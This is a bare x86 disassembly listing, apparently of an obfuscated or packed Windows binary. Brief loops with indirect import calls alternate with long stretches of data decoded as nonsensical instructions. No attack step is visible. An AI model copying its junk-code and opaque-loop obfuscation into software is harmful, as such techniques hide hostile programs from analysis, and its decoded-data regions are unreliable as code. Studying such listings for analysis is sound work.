  40e109:	sbb    ebx,DWORD PTR ds:0x42fce9
  40e10f:	jmp    0x40e279
  40e114:	sub    dl,0xce
  40e117:	gs push 0x61
  40e11a:	mov    bh,0xf1
  40e11c:	fstp   DWORD PTR [ecx-0x6ff72fbc]
  40e122:	jmp    0x40e0ba
  40e124:	push   0xc37070a6
  40e129:	jg     0x40e19b
  40e12b:	jo     0x40e134
  40e12d:	fmul   st,st(4)
  40e12f:	cmp    ah,BYTE PTR [edx+0x5e4f0d9a]
  40e135:	arpl   WORD PTR [edx-0x6fa35b81],bx
  40e13b:	mov    ah,0xbc
  40e13d:	fiadd  DWORD PTR [edi+0x38d8ca79]
  40e143:	xchg   bl,ah
  40e145:	push   ss
  40e146:	push   ebp
  40e147:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  40e149:	xlat   BYTE PTR ds:[ebx]
  40e14a:	dec    edi
  40e14b:	sub    BYTE PTR [edx+ebp*8-0x73],ah
  40e14f:	add    bh,BYTE PTR [ecx+edi*8+0x18d333e0]
  40e156:	ror    eax,0x3
  40e159:	mov    cl,BYTE PTR [ebp+0x17]
  40e15c:	mov    bh,0xa7
  40e15e:	cmp    BYTE PTR [ebx+0x78],al
  40e161:	jg     0x40e109
  40e163:	sbb    esp,DWORD PTR [ecx-0x270a2854]
  40e169:	test   dh,al
  40e16b:	sbb    DWORD PTR [eax-0x5],esi
  40e16e:	cld    
  40e16f:	ja     0x40e195
  40e171:	icebp  
  40e172:	mov    eax,ds:0x88c507ac
  40e177:	cmp    bh,dl
  40e179:	cld    
  40e17a:	pop    ebx
  40e17b:	mul    BYTE PTR [ebp-0x5d]
  40e17e:	clc    
  40e17f:	adc    al,0x2e
  40e181:	and    al,0xd4
  40e183:	ins    BYTE PTR es:[edi],dx
  40e184:	test   DWORD PTR [eax-0x44],esi
  40e187:	mov    WORD PTR [edx],gs
  40e189:	jbe    0x40e1a1
  40e18b:	out    0x92,eax
  40e18d:	addr16 nop
  40e18f:	jno    0x40e125
  40e191:	sar    BYTE PTR [edx+ebx*2],0x3c
  40e195:	push   cs
  40e196:	scas   al,BYTE PTR es:[edi]
  40e197:	and    eax,0x6a177336
  40e19c:	rcr    ecx,cl
  40e19e:	push   ds
  40e19f:	adc    DWORD PTR cs:[ebx],esi
  40e1a2:	and    eax,ebp
  40e1a4:	adc    bl,BYTE PTR [edi+0x77c4c83]
  40e1aa:	mov    WORD PTR [edx+0x1120e094],?
  40e1b0:	xor    ebp,ebx
  40e1b2:	mov    ebx,0x43a37de7
  40e1b7:	enter  0x553e,0xdf
  40e1bb:	mov    eax,ds:0x8836d1ab
  40e1c0:	mov    ds:0xfa5f01ba,al
  40e1c5:	fdivrp st(2),st
  40e1c7:	mov    dl,dl
  40e1c9:	ret    
  40e1ca:	or     ecx,DWORD PTR [ecx+esi*1]
  40e1cd:	clc    
  40e1ce:	pushf  
  40e1cf:	arpl   WORD PTR [esi],sp
  40e1d1:	in     al,0xc1
  40e1d3:	stos   DWORD PTR es:[edi],eax
  40e1d4:	shl    DWORD PTR [ebx+0x75],0x46
  40e1d8:	mov    ebp,0xf8dbd7dc
  40e1dd:	scas   eax,DWORD PTR es:[edi]
  40e1de:	and    esp,ecx
  40e1e0:	push   edx
  40e1e1:	push   ebx
  40e1e2:	jnp    0x40e17e
  40e1e4:	pop    ss
  40e1e5:	dec    ebx
  40e1e6:	scas   al,BYTE PTR es:[edi]
  40e1e7:	lea    eax,ss:[ebx-0x44]
  40e1eb:	push   DWORD PTR [esp+ecx*4+0x7b]
  40e1ef:	mov    DWORD PTR [esi+0x6d738444],eax
  40e1f5:	mov    WORD PTR [ecx+0x7c6fe8ff],gs
  40e1fb:	and    eax,0xe185d67e
  40e200:	pop    eax
  40e201:	repz test ebp,0x8424850d
  40e208:	mov    esi,DWORD PTR [edi]
  40e20a:	pop    ds
  40e20b:	push   ebp
  40e20c:	pushf  
  40e20d:	cmp    cl,BYTE PTR [ebp-0x792987da]
  40e213:	jnp    0x40e287
  40e215:	push   cs
  40e216:	ror    DWORD PTR [ecx+0x46],0xbe
  40e21a:	(bad)  
  40e21b:	fdivr  st(6),st
  40e21d:	loopne 0x40e1f2
  40e21f:	popf   
  40e220:	xor    esi,DWORD PTR [eax]
  40e222:	or     esp,eax
  40e224:	fnstenv [edi+edx*2+0x2de613f1]
  40e22b:	xchg   ebx,eax
  40e22c:	xor    DWORD PTR [ebx-0x22],eax
  40e22f:	jl     0x40e1de
  40e231:	dec    eax
  40e232:	push   ebx
  40e233:	pop    ds
  40e234:	and    DWORD PTR [ebx+0x6fd7347e],edx
  40e23a:	cmpxchg ch,ah
  40e23d:	pop    es
  40e23e:	or     ebx,DWORD PTR [ecx+0x53]
  40e241:	dec    ecx
  40e242:	sub    ebx,esi
  40e244:	mov    ecx,0x56cff936
  40e249:	dec    edx
  40e24a:	in     eax,0x0
  40e24c:	lds    edi,FWORD PTR [ebp+0x356c37ea]
  40e252:	jmp    FWORD PTR [edx+0x528cb21]
  40e258:	ret    
  40e259:	jg     0x40e2ae
  40e25b:	arpl   sp,sp
  40e25d:	cld    
  40e25e:	add    al,0xe2
  40e260:	rcl    DWORD PTR [ecx+0x2d],0xc8
  40e264:	push   cs
  40e265:	mov    dh,0x8b
  40e267:	jmp    0x40e2b0
  40e269:	int3   
  40e26a:	bound  esp,QWORD PTR [ebp-0x2fdbd75b]
  40e270:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e271:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e272:	mov    WORD PTR [esi],cs
  40e274:	sahf   
  40e275:	push   ebp
  40e276:	sahf   
  40e277:	push   ds
  40e278:	stos   BYTE PTR es:[edi],al
  40e279:	mov    DWORD PTR [ecx],eax
  40e27b:	lea    eax,[ebp-0x4]
  40e27e:	and    DWORD PTR ds:0x42fcfd,0x0
  40e288:	mov    ecx,DWORD PTR ds:0x42fcfd
  40e28e:	inc    ecx
  40e28f:	mov    DWORD PTR ds:0x42fcfd,ecx
  40e295:	cmp    DWORD PTR ds:0x42fcfd,0x8
  40e29c:	jne    0x40e2b0
  40e2a2:	push   DWORD PTR [ebp-0x14]
  40e2a5:	push   0x5961
  40e2aa:	call   DWORD PTR ds:0x42e563
  40e2b0:	cmp    DWORD PTR ds:0x42fcfd,0x7
  40e2b7:	jne    0x40e2ca
  40e2bd:	mov    ecx,DWORD PTR ds:0x42fcfd
  40e2c3:	inc    ecx
  40e2c4:	mov    DWORD PTR ds:0x42fcfd,ecx
  40e2ca:	cmp    DWORD PTR ds:0x42fcfd,0x15
  40e2d1:	jb     0x40e288
  40e2d7:	and    DWORD PTR ds:0x42fd6e,0x0
  40e2e1:	jmp    0x40e2f3
  40e2e6:	mov    ecx,DWORD PTR ds:0x42fd6e
  40e2ec:	inc    ecx
  40e2ed:	mov    DWORD PTR ds:0x42fd6e,ecx
  40e2f3:	cmp    DWORD PTR ds:0x42fd6e,0x1b
  40e2fa:	jae    0x40e34c
  40e300:	cmp    DWORD PTR ds:0x42fd6e,0x9
  40e307:	jne    0x40e31b
  40e30d:	push   DWORD PTR [ebp-0x28]
  40e310:	push   0x42fd01
  40e315:	call   DWORD PTR ds:0x42e477
  40e31b:	cmp    DWORD PTR ds:0x42fd6e,0x8
  40e322:	jne    0x40e335
  40e328:	mov    ecx,DWORD PTR ds:0x42fd6e
  40e32e:	inc    ecx
  40e32f:	mov    DWORD PTR ds:0x42fd6e,ecx
  40e335:	jmp    0x40e2e6
  40e33a:	mov    ebx,DWORD PTR ds:0x42e794
  40e340:	mov    ecx,DWORD PTR ds:0x42e79c
  40e346:	sub    ebx,ecx
  40e348:	imul   ebx,DWORD PTR [ebx+ecx*1]
  40e34c:	mov    DWORD PTR [ebp-0x10],eax
  40e34f:	sub    ecx,ebx
  40e351:	mov    eax,DWORD PTR [ebp+0x8]
  40e354:	and    ebx,ecx
  40e356:	mov    ecx,DWORD PTR [ebp-0x10]
  40e359:	sbb    DWORD PTR ds:0x42fd72,ecx
  40e35f:	xor    eax,esi
  40e361:	add    eax,edi
  40e363:	mov    DWORD PTR [ecx],eax
  40e365:	jmp    0x40e4cf
  40e36a:	icebp  
  40e36b:	ja     0x40e334
  40e36d:	pop    ds
  40e36e:	inc    ecx
  40e36f:	scas   eax,DWORD PTR es:[edi]
  40e370:	icebp  
  40e371:	jno    0x40e314
  40e373:	push   edi
  40e374:	inc    eax
  40e375:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e376:	cs rcr bl,cl
  40e379:	cmp    DWORD PTR [ebx],edi
  40e37b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e37c:	jo     0x40e3ee
  40e37e:	ret    
  40e37f:	jg     0x40e3f1
  40e381:	jo     0x40e3c2
  40e383:	ja     0x40e349
  40e385:	mov    cl,BYTE PTR [ecx+0x3e]
  40e388:	dec    ebp
  40e389:	pop    esp
  40e38a:	retf   0x64ba
  40e38d:	mov    ch,BYTE PTR [ecx+0x13fadb6c]
  40e393:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e394:	add    esi,DWORD PTR [ecx+0x15]
  40e397:	fmul   DWORD PTR [edi]
  40e399:	cwde   
  40e39a:	pop    ss
  40e39b:	jmp    0xa1b621a0
  40e3a0:	sahf   
  40e3a1:	imul   ebp,DWORD PTR [ecx+esi*4+0x5d],0x45370644
  40e3a9:	aaa    
  40e3aa:	cmp    bh,ah
  40e3ac:	or     DWORD PTR [edi],edx
  40e3ae:	repz and ch,BYTE PTR [ebp+0x5bf4ef2]
  40e3b5:	ficom  DWORD PTR [esi-0x428b0a2f]
  40e3bb:	cmp    al,0xb1
  40e3bd:	das    
  40e3be:	jae    0x40e37b
  40e3c0:	dec    esp
  40e3c1:	dec    edx
  40e3c2:	mov    ds:0x1e53254c,eax
  40e3c7:	fdivr  st(4),st
  40e3c9:	dec    esi
  40e3ca:	test   eax,0xd50751d7
  40e3cf:	add    dh,0x90
  40e3d2:	pop    ebp
  40e3d3:	nop
  40e3d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e3d5:	aas    
  40e3d6:	mov    ecx,0x7082253b
  40e3db:	pop    eax
  40e3dc:	ret    0x9e7d
  40e3df:	ins    DWORD PTR es:[edi],dx
  40e3e0:	dec    edi
  40e3e1:	cmp    BYTE PTR [ecx-0x5f5186f],dh
  40e3e7:	fs mov al,0x1f
  40e3ea:	jmp    0x40e3bf
  40e3ec:	xchg   ebx,eax
  40e3ed:	in     eax,0xc8
  40e3ef:	push   es
  40e3f0:	mov    ds:0xfc79bba0,al
  40e3f5:	mov    BYTE PTR [edi+0x60ee94b8],bl
  40e3fb:	adc    BYTE PTR [edi],cl
  40e3fd:	sahf   
  40e3fe:	mov    eax,ds:0x407757d5
  40e403:	jecxz  0x40e3f4
  40e405:	dec    esp
  40e406:	aad    0x54
  40e408:	rol    DWORD PTR [edx],0x7f
  40e40b:	nop
  40e40c:	shr    DWORD PTR [edx+esi*2+0x5a3519b9],1
  40e413:	imul   edx,DWORD PTR [eax+0x2],0x34
  40e417:	cmp    al,0xc4
  40e419:	dec    eax
  40e41a:	fcom   DWORD PTR [ebx]
  40e41c:	xchg   edi,eax
  40e41d:	clc    
  40e41e:	push   ss
  40e41f:	mov    eax,0x5eefc784
  40e424:	xor    eax,0xd22e3acf
  40e429:	ss repz retf 0x9e53
  40e42e:	in     eax,0x88
  40e430:	fcomi  st,st(4)
  40e432:	imul   ecx,DWORD PTR [eax+ebp*4],0xffffffee
  40e436:	stc    
  40e437:	in     eax,0x71
  40e439:	test   BYTE PTR [ebp+0x27],cl
  40e43c:	lock pop ebp
  40e43e:	add    al,0xe4
  40e440:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e441:	cmp    DWORD PTR [edx-0x76],edi
  40e444:	dec    ebp
  40e445:	test   al,0xa7
  40e447:	mov    eax,ds:0x673a97a7
  40e44c:	pop    edi
  40e44d:	fistp  DWORD PTR [edi]
  40e44f:	mov    ch,0x21
  40e451:	xor    eax,0x2e7ed64a
  40e456:	mov    al,ds:0xbff8f379
  40e45b:	mov    ch,0xc8
  40e45d:	jmp    0x40e494
  40e45f:	lods   eax,DWORD PTR ds:[esi]
  40e460:	mov    ebx,0xd7bb7917
  40e465:	fs je  0x40e4c6
  40e468:	imul   ebp,DWORD PTR [esi-0x63429a93],0xffffffe1
  40e46f:	int3   
  40e470:	mov    esi,0x3ab269c8
  40e475:	xchg   ecx,eax
  40e476:	cmp    al,0x80
  40e478:	lea    edi,[ebx]
  40e47a:	js     0x40e446
  40e47c:	ins    BYTE PTR es:[edi],dx
  40e47d:	clc    
  40e47e:	(bad)  
  40e47f:	xor    cl,BYTE PTR [ecx-0x7f]
  40e482:	lock add eax,DWORD PTR [edi+0x509e2bb2]
  40e489:	ret    0x361c
  40e48c:	mov    bh,0x89
  40e48e:	and    edx,DWORD PTR fs:[edx-0x3d]
  40e492:	sub    al,0xbc
  40e494:	mov    eax,0xa479da97
  40e499:	adc    eax,DWORD PTR [ecx]
  40e49b:	outs   dx,DWORD PTR ds:[esi]
  40e49c:	sbb    eax,0xfb6bb259
  40e4a1:	cmp    DWORD PTR [edx+0xf],0x1d6ed945
  40e4a8:	adc    al,0xbb
  40e4aa:	stos   BYTE PTR es:[edi],al
  40e4ab:	jb     0x40e461
  40e4ad:	mov    eax,0xbc806a0c
  40e4b2:	in     eax,dx
  40e4b3:	mov    ds,WORD PTR ds:0xabd23cae
  40e4b9:	shr    dh,0x87
  40e4bc:	fnstenv [edi-0x603f5f5]
  40e4c2:	inc    esi
  40e4c3:	lea    esi,[edi+ecx*8]
  40e4c6:	popf   
  40e4c7:	leave  
  40e4c8:	cs dec edx
  40e4ca:	ins    DWORD PTR es:[edi],dx
  40e4cb:	mov    esp,0xc7a0ca19
  40e4d0:	inc    ebp
  40e4d1:	call   0xf8dd6a07
  40e4d6:	and    ebx,0x399a
  40e4dc:	lea    eax,[ebp-0x18]
  40e4df:	mov    DWORD PTR [ebp-0x24],eax
  40e4e2:	jmp    0x40e64c
  40e4e7:	ror    DWORD PTR [eax+edi*4+0x61f15519],0x74
  40e4ef:	sbb    al,BYTE PTR ds:0x6740740f
  40e4f5:	jnp    0x40e523
  40e4f7:	mov    fs,WORD PTR [ebx+0x7fc37070]
  40e4fd:	jo     0x40e56f
  40e4ff:	repz and DWORD PTR [ebx-0x6b7495af],0x25764007
  40e50a:	jmp    0x40e511
  40e50c:	rol    DWORD PTR [edx-0x6ee2a2b5],cl
  40e512:	jmp    0x40e4b9
  40e514:	ret    
  40e515:	mov    ds:0x7f41545e,eax
  40e51a:	jp     0x40e58b
  40e51c:	pushf  
  40e51d:	cmp    ah,BYTE PTR [eax]
  40e51f:	enter  0x746e,0xfe
  40e523:	push   ecx
  40e524:	mov    ah,0xea
  40e526:	sub    eax,DWORD PTR [ebp+0x7240977d]
  40e52c:	mov    bh,BYTE PTR [ebp+0x58dab2bc]
  40e532:	xor    bl,al
  40e534:	mov    ds:0xc4fa603d,eax
  40e539:	xor    DWORD PTR [eax+0x414dd0f7],0x6
  40e540:	and    BYTE PTR [esi-0x6],ch
  40e543:	pop    edx
  40e544:	inc    ebp
  40e545:	lods   al,BYTE PTR ds:[esi]
  40e546:	dec    edi
  40e547:	add    eax,0xc10073d1
  40e54c:	test   al,0xa5
  40e54e:	and    al,BYTE PTR [edx+0x1eb00e84]
  40e554:	js     0x40e4ec
  40e556:	loope  0x40e5ca
  40e558:	xchg   esp,eax
  40e559:	test   DWORD PTR [ebx+0xf],edx
  40e55c:	lds    ebx,FWORD PTR [edi+eiz*8-0xf]
  40e560:	scas   al,BYTE PTR es:[edi]
  40e561:	or     al,BYTE PTR [ebp-0x50]
  40e564:	push   edx
  40e565:	cld    
  40e566:	call   0x74e1:0x7cdbe739
  40e56d:	and    eax,0x373ff0e7
  40e572:	test   DWORD PTR [ebx+0x34dbe098],edi
  40e578:	dec    ebx
  40e579:	sub    ecx,DWORD PTR [ecx-0xc6720ce]
  40e57f:	cmp    DWORD PTR [ebx+0x41],edx
  40e582:	aaa    
  40e583:	mov    ebp,edi
  40e585:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e586:	ins    BYTE PTR es:[edi],dx
  40e587:	push   cs
  40e588:	lds    eax,FWORD PTR [ebx]
  40e58a:	nop
  40e58b:	jmp    0x40e601
  40e58d:	outs   dx,DWORD PTR ds:[esi]
  40e58e:	call   0x6a35:0x97ac2c3d
  40e595:	lock mov eax,ds:0xe5a7a378
  40e59b:	jo     0x40e5dc
  40e59d:	adc    eax,0x75cb32b5
  40e5a2:	fcmovu st,st(1)
  40e5a4:	mov    esp,0x71ea07c9
  40e5a9:	sbb    BYTE PTR [ecx-0x11],ch
  40e5ac:	loope  0x40e5fc
  40e5ae:	adc    eax,0xa4bc707a
  40e5b3:	jb     0x40e603
  40e5b5:	jp     0x40e5a3
  40e5b7:	das    
  40e5b8:	add    al,0x1e
  40e5ba:	cmp    ebp,edx
  40e5bc:	js     0x40e581
  40e5be:	cmp    eax,0xc4c188b7
  40e5c3:	imul   ebx,DWORD PTR [edx+eiz*1+0x16],0x70
  40e5c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e5c9:	sub    dh,BYTE PTR [ebp+eax*2+0x5ffa9dc5]
  40e5d0:	push   0x9c83fda1
  40e5d5:	retf   
  40e5d6:	xchg   ecx,eax
  40e5d7:	mov    esp,0x2d5be406
  40e5dc:	and    al,0xcf
  40e5de:	and    eax,0x7f50b415
  40e5e3:	push   esi
  40e5e4:	mov    dh,dh
  40e5e6:	rcr    DWORD PTR [eax-0x6adcfab9],0xa7
  40e5ed:	(bad)  
  40e5ee:	mov    ds:0xd62f7434,al
  40e5f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e5f4:	push   0x78
  40e5f6:	sub    ebx,ebp
  40e5f8:	push   ebp
  40e5f9:	jl     0x40e62f
  40e5fb:	mov    dl,cl
  40e5fd:	pop    ecx
  40e5fe:	mov    edi,DWORD PTR [ebx-0x59]
  40e601:	cmp    bl,bl
  40e603:	(bad)  
  40e604:	daa    
  40e605:	mov    ecx,0x1f844735
  40e60a:	cmp    ah,ch
  40e60c:	mov    WORD PTR [esi],gs
  40e60e:	retf   0xf562
  40e611:	dec    ebp
  40e612:	mov    ah,0x6a
  40e614:	fdiv   DWORD PTR [ebp-0x1a]
  40e617:	imul   ecx,DWORD PTR [edi+edi*1],0x83d50a79
  40e61e:	js     0x40e5cb
  40e620:	push   esi
  40e621:	pop    edx
  40e622:	cli    
  40e623:	mov    cl,0xb5
  40e625:	cmp    dh,BYTE PTR [edx+0x7ba89ed2]
  40e62b:	sahf   
  40e62c:	lock mov WORD PTR [eax],ds
  40e62f:	inc    esi
  40e630:	outs   dx,DWORD PTR fs:[esi]
  40e632:	(bad)
  40e635:	cwde   
  40e636:	lds    eax,FWORD PTR [esi-0x1993db42]
  40e63c:	leave  
  40e63d:	inc    ebx
  40e63e:	push   esp
  40e63f:	pop    edi
  40e640:	fild   DWORD PTR [ebp-0x498382b8]
  40e646:	into   
  40e647:	sbb    ah,cl
  40e649:	cs dec ebp
  40e64b:	ins    DWORD PTR es:[edi],dx
  40e64c:	mov    eax,DWORD PTR [ebp-0x18]
  40e64f:	and    DWORD PTR ds:0x42fd7a,0x0
  40e659:	jmp    0x40e66b
  40e65e:	mov    ebx,DWORD PTR ds:0x42fd7a
  40e664:	inc    ebx
  40e665:	mov    DWORD PTR ds:0x42fd7a,ebx
  40e66b:	cmp    DWORD PTR ds:0x42fd7a,0x1e
  40e672:	jae    0x40e697
  40e678:	cmp    DWORD PTR ds:0x42fd7a,0x24
  40e67f:	jne    0x40e690
  40e685:	push   0x1cae
  40e68a:	call   DWORD PTR ds:0x42e47b
  40e690:	jmp    0x40e65e
  40e695:	neg    ebx
  40e697:	mov    ecx,DWORD PTR [ebp-0x24]
  40e69a:	add    ebx,0x74bf
  40e6a0:	xor    eax,esi
  40e6a2:	add    eax,edi
  40e6a4:	sub    DWORD PTR ds:0x42e11c,edx
  40e6aa:	mov    DWORD PTR [ecx],eax
  40e6ac:	mov    eax,ds:0x41b27c
  40e6b1:	adc    DWORD PTR ds:0x42fd01,ebx
  40e6b7:	mov    ebx,0x8e12febe
  40e6bc:	mov    DWORD PTR [ebp-0xc],ebx
  40e6bf:	adc    DWORD PTR ds:0x42fcd9,0x7944
  40e6c9:	jmp    0x40e833
  40e6ce:	cmp    dl,bl
  40e6d0:	in     al,dx
  40e6d1:	fcomi  st,st(1)
  40e6d3:	jecxz  0x40e69e
  40e6d5:	icebp  
  40e6d6:	xor    al,0x3a
  40e6d8:	iret   
  40e6d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6da:	sbb    BYTE PTR [ebx+esi*1],0xb4
  40e6de:	push   ecx
  40e6df:	mov    ds:0x7fc37070,al
  40e6e4:	jo     0x40e756
  40e6e6:	cs inc edx
  40e6e8:	mov    al,ds:0x55fcf950
  40e6ed:	mov    al,ds:0xea8b5512
  40e6f2:	adc    ah,BYTE PTR [ebx+0x2137e6c9]
  40e6f8:	xchg   BYTE PTR [edi-0x6df48843],ah
  40e6fe:	mov    edi,0x4748d28
  40e703:	fstp   DWORD PTR [ebp-0x52]
  40e706:	add    DWORD PTR [edi+edx*2-0x6fba8c77],esp
  40e70d:	sahf   
  40e70e:	cmp    dh,BYTE PTR [ecx-0x7600b5c4]
  40e714:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e715:	cli    
  40e716:	sbb    esp,DWORD PTR ds:0x5eb50f82
  40e71c:	push   ecx
  40e71d:	mov    esp,ecx
  40e71f:	add    cl,BYTE PTR [eax-0x2d4a9c60]
  40e725:	jecxz  0x40e6bd
  40e727:	mov    BYTE PTR [edx-0x2590c60],dl
  40e72d:	mov    ebp,0x10d54890
  40e732:	dec    ebp
  40e733:	pop    ebp
  40e734:	ins    DWORD PTR es:[edi],dx
  40e735:	sbb    al,0x28
  40e737:	push   cs
  40e738:	test   edx,ecx
  40e73a:	(bad)
  40e73d:	cwde   
  40e73e:	repz int3 
  40e740:	mov    ecx,0x9d48efc
  40e745:	push   es
  40e746:	mov    ds:0xcfd8792e,al
  40e74b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e74c:	inc    edi
  40e74d:	xor    bl,al
  40e74f:	dec    esp
  40e750:	cmp    BYTE PTR es:[eax+0x35],cl
  40e754:	ds xor eax,0x92ac5507
  40e75a:	cld    
  40e75b:	pop    esi
  40e75c:	(bad)  
  40e75e:	sub    BYTE PTR [edx],dh
  40e760:	sub    BYTE PTR [edx+0x11206ce8],bh
  40e766:	bound  ebp,QWORD PTR [eax+0x6b95140a]
  40e76c:	add    bh,BYTE PTR [eax]
  40e76e:	nop
  40e76f:	sub    al,0x4c
  40e771:	or     eax,0x63f7af75
  40e776:	dec    ebp
  40e777:	xor    bl,BYTE PTR [esi-0x1d]
  40e77a:	mov    ecx,0x39405089
  40e77f:	cmp    bh,al
  40e781:	inc    edi
  40e782:	mov    dl,0x8e
  40e784:	pop    ds
  40e785:	or     al,ah
  40e787:	sbb    dl,0x3
  40e78a:	mov    WORD PTR [edi+0x717765c7],cs
  40e790:	mov    ebx,0xfbab1793
  40e795:	sub    DWORD PTR [ecx-0x54],ecx
  40e798:	add    eax,0x23e2d48d
  40e79d:	xlat   BYTE PTR ds:[ebx]
  40e79e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e79f:	or     al,0x66
  40e7a1:	jb     0x40e7ed
  40e7a3:	sbb    DWORD PTR [ebp-0x55],0x6b7c6337
  40e7aa:	fistp  DWORD PTR [ebx]
  40e7ac:	in     eax,dx
  40e7ad:	(bad)  
  40e7ae:	scas   eax,DWORD PTR es:[di]
  40e7b0:	les    esi,FWORD PTR [ecx*8-0x39d7d207]
  40e7b7:	dec    esp
  40e7b8:	test   BYTE PTR [edi+0x10d79eee],bh
  40e7be:	xor    BYTE PTR [ecx+0x65],bl
  40e7c1:	fsub   st,st(2)
  40e7c3:	out    dx,al
  40e7c4:	fdiv   st,st(4)
  40e7c6:	xchg   ebp,eax
  40e7c7:	mov    dh,0x5e
  40e7c9:	out    dx,al
  40e7ca:	rol    edi,cl
  40e7cc:	xchg   DWORD PTR [ebx+0x2c39107f],edx
  40e7d2:	in     al,0x87
  40e7d4:	retf   0x9b19
  40e7d7:	xor    ebp,DWORD PTR [ebp-0x25]
  40e7da:	ds sbb eax,0xa20fe4dd
  40e7e0:	(bad)  
  40e7e1:	jae    0x40e7cc
  40e7e3:	fwait
  40e7e4:	cmc    
  40e7e5:	pop    eax
  40e7e6:	jnp    0x40e82e
  40e7e8:	jmp    0x7a4f:0x812c6355
  40e7ef:	lods   eax,DWORD PTR ds:[esi]
  40e7f0:	jecxz  0x40e7dc
  40e7f2:	test   al,0x38
  40e7f4:	stc    
  40e7f5:	adc    eax,0x10403f4e
  40e7fa:	es out dx,al
  40e7fc:	imul   eax,DWORD PTR [edi-0x5f],0x30
  40e800:	ror    BYTE PTR [eax+0x696c729e],0x7
  40e807:	retf   0xfa93
  40e80a:	arpl   si,bx
  40e80c:	shr    DWORD PTR [edi-0x7d],0x42
  40e810:	ins    BYTE PTR es:[edi],dx
  40e811:	(bad)  
  40e813:	cli    
  40e814:	sbb    esp,DWORD PTR [ebp-0x25]
  40e817:	push   0x56686c48
  40e81c:	cmp    al,0xe2
  40e81e:	xor    al,0x2c
  40e820:	das    
  40e821:	jge    0x40e8a1
  40e823:	scas   eax,DWORD PTR es:[edi]
  40e824:	aad    0x1e
  40e826:	js     0x40e81f
  40e828:	std    
  40e829:	sbb    al,0x1f
  40e82b:	ds mov edx,0x1056cb06
  40e831:	(bad)  
  40e832:	dec    ebx
  40e833:	mov    eax,DWORD PTR [eax]
  40e835:	adc    DWORD PTR ds:0x42fce9,0x5067
  40e83f:	mov    cx,WORD PTR [ebp-0x4]
  40e843:	xor    DWORD PTR ds:0x42fd0d,0x42fd7e
  40e84d:	movzx  ecx,cx
  40e850:	add    ecx,DWORD PTR [eax]
  40e852:	neg    eax
  40e854:	mov    DWORD PTR [ebp-0x14],0xf89c853d
  40e85b:	sbb    eax,0x5a1e
  40e860:	mov    DWORD PTR [ebp-0x1c],ecx
  40e863:	mov    eax,DWORD PTR [ebp+0x8]
  40e866:	sbb    ecx,DWORD PTR ds:0x42fce1
  40e86c:	mov    ecx,DWORD PTR [ebp-0x8]
  40e86f:	xor    DWORD PTR ds:0x42e11c,0x42e6ef
  40e879:	xor    eax,esi
  40e87b:	and    DWORD PTR ds:0x42e70b,0x57ad
  40e885:	add    eax,edi
  40e887:	cmp    DWORD PTR [ecx],eax
  40e889:	jne    0x40efe4
  40e88f:	and    DWORD PTR ds:0x42fcd1,0x0
  40e899:	jmp    0x40e8ab
  40e89e:	mov    ecx,DWORD PTR ds:0x42fcd1
  40e8a4:	inc    ecx
  40e8a5:	mov    DWORD PTR ds:0x42fcd1,ecx
  40e8ab:	cmp    DWORD PTR ds:0x42fcd1,0x11
  40e8b2:	jae    0x40e8fe
  40e8b8:	cmp    DWORD PTR ds:0x42fcd1,0x8
  40e8bf:	jne    0x40e8d0
  40e8c5:	push   0x42e1e7
  40e8ca:	call   DWORD PTR ds:0x42e47f
  40e8d0:	cmp    DWORD PTR ds:0x42fcd1,0x7
  40e8d7:	jne    0x40e8ec
  40e8dd:	xor    ecx,ecx
  40e8df:	add    ecx,DWORD PTR ds:0x42fcd1
  40e8e5:	inc    ecx
  40e8e6:	mov    DWORD PTR ds:0x42fcd1,ecx
  40e8ec:	jmp    0x40e89e
  40e8f1:	movzx  ecx,BYTE PTR ds:0x42fd8a
  40e8f8:	adc    DWORD PTR ds:0x42e6ff,ecx
  40e8fe:	mov    eax,DWORD PTR [ebp+0x8]
  40e901:	xor    DWORD PTR ds:0x42e6f7,0x70e3
  40e90b:	mov    ecx,DWORD PTR [ebp-0x1c]
  40e90e:	and    DWORD PTR ds:0x42e6fb,0x42e6ef
  40e918:	xor    eax,esi
  40e91a:	not    DWORD PTR ds:0x42fd01
  40e920:	add    eax,edi
  40e922:	mov    DWORD PTR ds:0x42fd0d,0x37d2
  40e92c:	cmp    DWORD PTR [ecx],eax
  40e92e:	mov    DWORD PTR ds:0x42e70b,0x263d
  40e938:	jmp    0x40eaa2
  40e93d:	(bad)  
  40e93e:	(bad)  
  40e93f:	fistp  DWORD PTR [ebx+0x65445961]
  40e945:	shl    BYTE PTR [edi-0x39],0x63
  40e949:	add    ecx,esi
  40e94b:	loop   0x40e929
  40e94d:	and    al,0xa0
  40e94f:	jo     0x40e9c1
  40e951:	ret    
  40e952:	jg     0x40e9c4
  40e954:	jo     0x40e930
  40e956:	cld    
  40e957:	and    eax,0x4ebd38d3
  40e95c:	rcr    ecx,0xa0
  40e95f:	clc    
  40e960:	cmp    eax,DWORD PTR [eax*1-0x429ae4b6]
  40e967:	xor    eax,0x68933a33
  40e96c:	jmp    0x268b:0xd8c32c46
  40e973:	dec    eax
  40e974:	out    0xff,eax
  40e976:	cwde   
  40e977:	or     eax,0x745369c8
  40e97c:	das    
  40e97d:	aam    0x82
  40e97f:	mov    ecx,0x703420f8
  40e984:	xor    al,ch
  40e986:	jmp    0xd8e8:0x6c88ead7
  40e98d:	retf   
  40e98e:	jnp    0x40e948
  40e990:	out    0xbc,eax
  40e992:	cdq    
  40e993:	or     bl,bh
  40e995:	fidivr WORD PTR [ecx+0x69]
  40e998:	xchg   ecx,eax
  40e999:	dec    ecx
  40e99a:	xchg   ecx,eax
  40e99b:	jecxz  0x40ea10
  40e99d:	adc    ebp,edx
